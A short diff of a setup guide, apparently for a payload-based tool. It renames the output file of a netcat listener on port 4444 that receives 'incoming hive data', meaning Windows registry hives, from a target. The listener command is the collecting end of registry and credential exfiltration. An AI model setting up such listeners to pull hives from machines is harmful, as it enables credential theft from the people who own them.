@@ -33,7 +33,7 @@ Start your listener on the receiver host to capture incoming hive data:
 
 ```bash
 # Example netcat listener setup
-nc -lvnp 4444 > registry_hives.tar.gz
+nc -lvnp 4444 > registry_hives.zip
 ```
 
 Configure target parameters in `payload.txt`:
